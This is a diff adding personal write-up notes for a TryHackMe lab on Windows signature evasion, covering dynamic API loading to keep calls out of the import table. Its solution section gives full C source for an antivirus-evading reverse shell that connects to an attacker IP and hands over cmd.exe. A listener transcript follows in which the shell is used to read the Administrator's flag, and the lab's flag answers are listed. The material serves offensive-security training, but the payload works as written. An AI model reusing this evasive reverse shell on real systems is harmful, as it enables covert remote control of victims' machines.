@@ -505,3 +505,257 @@ One of the most critical functions of the Windows loader is the IAT (Import Addr
 The IAT is stored in the PE (Portable Executable) header IMAGE_OPTIONAL_HEADER and is filled by the Windows loader at runtime. The Windows loader obtains the function addresses or, more precisely, thunks from a pointer table, accessed from an API call or thunk table. Check out the Windows Internals room for more information about the PE structure.
 At a glance, an API is assigned a pointer to a thunk as the function address from the Windows loader. To make this a little more tangible, we can observe an example of the PE dump for a function.
 The import table can provide a lot of insight into the functionality of a binary that can be detrimental to an adversary. But how can we prevent our functions from appearing in the IAT if it is required to assign a function address?
+As briefly mentioned, the thunk table is not the only way to obtain a pointer for a function address. We can also utilize an API call to obtain the function address from the import library itself. This technique is known as dynamic loading and can be used to avoid the IAT and minimize the use of the Windows loader.
+We will write our structures and create new arbitrary names for functions to employ dynamic loading.
+At a high level, we can break up dynamic loading in C languages into four steps,
+Define the structure of the call
+Obtain the handle of the module the call address is present in
+Obtain the process address of the call
+Use the newly created call
+To begin dynamically loading an API call, we must first define a structure for the call before the main function. The call structure will define any inputs or outputs that may be required for the call to function. We can find structures for a specific call on the Microsoft documentation. For example, the structure for GetComputerNameA can be found [here](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea). Because we are implementing this as a new call in C, the syntax must change a little, but the structure stays the same, as seen below.
+```text
+// 1. Define the structure of the call
+typedef BOOL (WINAPI* myNotGetComputerNameA)(
+	LPSTR   lpBuffer,
+	LPDWORD nSize
+);
+```
+To access the address of the API call, we must first load the library where it is defined. We will define this in the main function. This is commonly kernel32.dll or ntdll.dll for any Windows API calls. Below is an example of the syntax required to load a library into a module handle.
+```text
+// 2. Obtain the handle of the module the call address is present in 
+HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
+```
+Using the previously loaded module, we can obtain the process address for the specified API call. This will come directly after the LoadLibrary call. We can store this call by casting it along with the previously defined structure. Below is an example of the syntax required to obtain the API call.
+```text
+// 3. Obtain the process address of the call
+myNotGetComputerNameA notGetComputerNameA = (myNotGetComputerNameA) GetProcAddress(hkernel32, "GetComputerNameA");
+```
+Although this method solves many concerns and problems, there are still several considerations that must be noted. Firstly, GetProcAddress and LoadLibraryA are still present in the IAT; although not a direct indicator it can lead to or reinforce suspicion; this problem can be solved using PIC (Position Independent Code). Modern agents will also hook specific functions and monitor kernel interactions; this can be solved using API unhooking.
+Using the knowledge you have accrued throughout this task, obfuscate the following C snippet, ensuring no suspicious API calls are present in the IAT.
+```text
+#include <windows.h>
+#include <stdio.h>
+#include <lm.h>
+
+int main() {
+    printf("GetComputerNameA: 0x%p\\n", GetComputerNameA);
+    CHAR hostName[260];
+    DWORD hostNameLength = 260;
+    if (GetComputerNameA(hostName, &hostNameLength)) {
+        printf("hostname: %s\\n", hostName);
+    }
+}
+```
+Once sufficiently obfuscated, submit the snippet to the webserver at http://MACHINE_IP/challenge-2.html. The file name must be saved as challenge-2.exe. If correctly obfuscated a flag will appear in an alert pop-up.
+What flag is found after uploading a properly obfuscated snippet?
+You can compile your snippet using `x86_64-w64-mingw32-gcc challenge.c -o challenge-2.exe`
+![[Pasted image 20220917141802.png]]
+![[Pasted image 20220917141923.png]]
+### Putting It All Together
+As reiterated through both this room and Obfuscation Principles, no one method will be 100% effective or reliable.
+To create a more effective and reliable methodology, we can combine several of the methods covered in this room and the previous.
+When determining what order you want to begin obfuscation, consider the impact of each method. For example, is it easier to obfuscate an already broken class or is it easier to break a class that is obfuscated?
+Note: In general, You should run automated obfuscation or less specific obfuscation methods after specific signature breaking, however, you will not need those techniques for this challenge.
+Taking these notes into consideration, modify the provided binary to meet the specifications below.
+No suspicious library calls present
+No leaked function or variable names
+File hash is different than the original hash
+Binary bypasses common anti-virus engines
+Note: When considering library calls and leaked function, be conscious of the IAT table and strings of your binary.
+![[Pasted image 20220917142118.png]]
+![[Pasted image 20220917142146.png]]
+Once sufficiently obfuscated, compile the payload on the AttackBox or VM of your choice using GCC or other C compiler. The file name must be saved as challenge.exe. Once compiled, submit the executable to the webserver at http://10.10.245.34/. If your payload satisfies the requirements listed, it will be ran and a beacon will be sent to the provided server IP and port.
+Note: It is also essential to change the C2Server and C2Port variables in the provided payload or this challenge will not properly work and you will not receive a shell back.
+Note: When compiling with GCC you will need to add compiler options for winsock2 and ws2tcpip. These libraries can be included using the compiler flags -lwsock32 and -lws2_32
+If you are still stuck we have provided a walkthrough of the solution below.
+What is the flag found on the Administrator desktop?
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ i686-w64-mingw32-gcc challenge.c -o challenge.exe
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ ls
+challenge-1.ps1  challenge-2.exe  challenge-8.cpp  challenge.c  challenge.exe  flag1.ps
+```
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ cat challenge.c    
+#include <winsock2.h>
+#include <windows.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#define DEFAULT_BUFLEN 1024
+
+typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
+typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
+typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);
+typedef u_short(WSAAPI* HTONS)(u_short hostshort);
+typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
+typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
+typedef int(WSAAPI* WSACLEANUP)(void);
+
+void Run(char* Server, int Port) {
+
+HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
+WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, "WSAStartup");
+WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, "WSASocketA");
+INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, "inet_addr");
+HTONS myhtons = (HTONS) GetProcAddress(hws2_32, "htons");
+WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, "WSAConnect");
+CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, "closesocket");
+WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, "WSACleanup"); 
+
+        SOCKET s12;
+        struct sockaddr_in addr;
+        WSADATA version;
+        myWSAStartup(MAKEWORD(2,2), &version);
+        s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+        addr.sin_family = AF_INET;
+
+        addr.sin_addr.s_addr = myinet_addr(Server);
+        addr.sin_port = myhtons(Port);
+
+        if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0)==SOCKET_ERROR) {
+            myclosesocket(s12);
+            myWSACleanup();
+        } else {
+            
+            char P1[] = "cm";
+            char P2[] = "d.exe";
+            char* P = strcat(P1, P2);
+            STARTUPINFO sinfo;
+            PROCESS_INFORMATION pinfo;
+            memset(&sinfo, 0, sizeof(sinfo));
+            sinfo.cb = sizeof(sinfo);
+            sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+            sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) s12;
+            CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+
+            WaitForSingleObject(pinfo.hProcess, INFINITE);
+            CloseHandle(pinfo.hProcess);
+            CloseHandle(pinfo.hThread);
+        }
+}
+
+int main(int argc, char **argv) {
+    if (argc == 3) {
+        int port  = atoi(argv[2]);
+        Run(argv[1], port);
+    }
+    else {
+        char host[] = "10.11.81.220";
+        int port = 1234;
+        Run(host, port);
+    }
+    return 0;
+}
+```
+
+## Enumeration
+```text
+┌──(kali㉿kali)-[~/obfus]
+└─$ nc -nvlp 1234
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.58.30.
+Ncat: Connection from 10.10.58.30:49682.
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs>cd ..
+cd ..
+
+C:\xampp>cd ..
+cd ..
+```
+```text
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\
+
+11/14/2018  06:56 AM    <DIR>          EFI
+05/13/2020  05:58 PM    <DIR>          PerfLogs
+06/06/2022  05:28 PM    <DIR>          Program Files
+06/06/2022  05:28 PM    <DIR>          Program Files (x86)
+03/17/2021  03:00 PM    <DIR>          Users
+03/17/2021  02:59 PM    <DIR>          Windows
+06/06/2022  05:45 PM    <DIR>          xampp
+               0 File(s)              0 bytes
+               7 Dir(s)  13,862,584,320 bytes free
+```
+```text
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users
+
+03/17/2021  03:00 PM    <DIR>          .
+03/17/2021  03:00 PM    <DIR>          ..
+08/22/2022  04:22 PM    <DIR>          Administrator
+12/12/2018  07:45 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               4 Dir(s)  13,858,959,360 bytes free
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>ldir
+ldir
+'ldir' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop
+
+08/26/2022  05:07 PM    <DIR>          .
+08/26/2022  05:07 PM    <DIR>          ..
+08/26/2022  05:08 PM               848 dump.ps1
+06/06/2022  07:09 PM    <DIR>          dumpbin
+06/07/2022  03:46 AM                36 flag.txt
+               2 File(s)            884 bytes
+               3 Dir(s)  13,858,852,864 bytes free
+
+C:\Users\Administrator\Desktop>more flag.txt
+more flag.txt
+THM{08FU5C4710N_15 MY_10V3_14N6U463}
+```
+![[Pasted image 20220917153846.png]]
+### Conclusion
+Signature evasion can kick off the process of preparing a malicious application to evade cutting-edge solutions and detection measures.
+In this room, we covered how to identify signatures and break various types of signatures.
+The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.
+At this point, you can begin understanding other more advanced detection measures or analysis techniques and continue improving your offensive tool craft.
+Read the above and continue learning!
+
+## Flags / Answers
+- ![|333](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/1e9f66d4cc4de936cf372c1e7d4ceba1.png)
+- ***THM{70_D373C7_0r_70_N07_D373C7}***  [64 page](https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20workshops/DEFCON-27-Workshop-Anthony-Rose-Introduction-to-AMSI-Bypasses-and-Sandbox-Evasion-Notes.pdf)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/ab3f859f9dc34e6c4b41fe3437b2396d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/3e4c0050212e7c69d408135de36976a3.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/96630d6dbe47ad3204cc121e9b5bf84e.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/92db2f5431d34098678bbcbf8170af52.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/0d4ba9ba4348b53036cb2127f4968e87.png)
+- ***THM{N0_1MP0r75_F0r_Y0U}***
+- ***THM{08FU5C4710N_15 MY_10V3_14N6U463}***
+
+## Notes / Lessons Learned
+[[Obfuscation Principles]]
+
